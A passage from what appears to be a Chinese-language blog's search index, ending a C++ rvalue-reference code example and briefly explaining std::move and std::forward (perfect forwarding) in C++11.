obj=<span class="hljs-built_in">getObj</span>();<br>    std::cout&lt;&lt;obj.mPtr&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;*obj.mPtr&lt;&lt;std::endl;<br>    name1&amp;&amp; obj2=<span class="hljs-built_in">getObj</span>();<br>    std::cout&lt;&lt;obj2.mPtr&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;*obj2.mPtr&lt;&lt;std::endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="move"><a href="#move" class="headerlink" title="move"></a>move</h3><p>使用std::move方法可以将左值转换为右值。使用这个函数并不能移动任何东西，而是和移动构造函数一样都具有移动语义，将对象的状态或者所有权从一个对象转移到另一个对象，只是转移，没有内存拷贝。</p><h3 id="forward"><a href="#forward" class="headerlink" title="forward"></a>forward</h3><p>右值引用类型是独立于值的，一个右值引用作为函数参数的形参时，在函数内部转发该参数给内部其他函数时，它就变成一个左值，并不是原来的类型了。如果需要按照参数原来的类型转发到另一个函数，可以使用 C++11 提供的 std::forward () 函数，该函数实现的功能称之为完美转发。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
